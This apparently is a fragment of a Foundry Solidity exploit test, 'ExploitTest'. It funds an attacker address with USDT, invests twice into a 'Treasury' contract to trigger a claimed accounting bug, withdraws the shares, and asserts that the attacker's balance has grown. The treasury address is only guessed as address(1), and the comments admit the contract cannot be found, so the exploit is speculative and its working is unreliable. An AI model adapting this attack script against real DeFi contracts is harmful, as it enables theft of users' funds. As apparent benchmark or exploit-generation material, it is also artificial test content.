}

interface ITreasury {
    function invest(address token, uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    uint256 initialBalance;
    uint256 sharesOwned;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Only inject USDT tokens - no contract calls that could revert
        // USDT has 6 decimals
        deal(TARGET, attacker, 100_000 * 1e6);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial USDT balance
        uint256 balanceBefore = IERC20(TARGET).balanceOf(attacker);

        // The Treasury contract must exist for this vulnerability to be exploitable
        // Try to find it - common patterns include deployed at predictable address
        // or the test framework provides it

        // Try address(1) as a common test deployment pattern
        address treasury = address(1);

        // Define function selectors
        bytes4 investSig = bytes4(keccak256("invest(address,uint256)"));
        bytes4 withdrawSig = bytes4(keccak256("withdraw(uint256)"));
        bytes4 balanceSig = bytes4(keccak256("balanceOf(address)"));

        // Approve Treasury to spend our USDT
        IERC20(TARGET).approve(treasury, 100_000 * 1e6);

        // First investment
        (bool success1, ) = treasury.call(
            abi.encodeWithSelector(investSig, TARGET, 10_000 * 1e6)
        );

        // Second investment with different amount to trigger accounting bug
        if (success1) {
            IERC20(TARGET).approve(treasury, 100_000 * 1e6);
            treasury.call(
                abi.encodeWithSelector(investSig, TARGET, 5_000 * 1e6)
            );

            // Get our shares
            (, bytes memory sharesData) = treasury.staticcall(
                abi.encodeWithSelector(balanceSig, attacker)
            );
            uint256 shares = abi.decode(sharesData, (uint256));

            // Withdraw all shares to realize profit from accounting error
            if (shares > 0) {
                treasury.call(abi.encodeWithSelector(withdrawSig, shares));
            }
        }

        // Check final balance
        uint256 balanceAfter = IERC20(TARGET).balanceOf(attacker);

        // Oracle expects balance to increase
        assertGt(balanceAfter, balanceBefore, "Attacker USDT balance should increase");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
    fallback() external payable {}
}

